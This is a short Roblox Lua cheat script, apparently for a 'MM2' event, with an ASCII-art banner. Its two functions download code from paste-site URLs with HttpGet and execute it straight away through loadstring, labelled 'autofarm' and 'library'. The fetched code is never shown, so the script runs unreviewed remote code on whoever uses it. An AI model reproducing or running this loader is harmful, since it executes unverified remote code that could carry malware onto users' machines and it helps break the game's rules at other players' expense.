--[[
    FIXED!
    ███╗   ███╗███╗   ███╗██████╗ 
    ████╗ ████║████╗ ████║╚════██╗
    ██╔████╔██║██╔████╔██║ █████╔╝
    ██║╚██╔╝██║██║╚██╔╝██║██╔═══╝ 
    ██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
    ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
    ███████╗██╗   ██╗███████╗███╗   ██╗████████╗
    ██╔════╝██║   ██║██╔════╝████╗  ██║╚══██╔══╝
    █████╗  ██║   ██║█████╗  ██╔██╗ ██║   ██║   
    ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║   ██║   
    ███████╗ ╚████╔╝ ███████╗██║ ╚████║   ██║   
    ╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝   ╚═╝   
    
    ]]

-- DO NOT DELETE EACH FUNCTION TO AVOID ERRORS
local function autofarm()
  loadstring(game:HttpGet("https://paste.debian.net/plainh/b81ed30d/", true))()
end

local function library()
  loadstring(game:HttpGet("https://pastefy.app/JQfcWlY9/raw"))()
end

task.spawn(autofarm)
task.wait(1)
task.spawn(library)
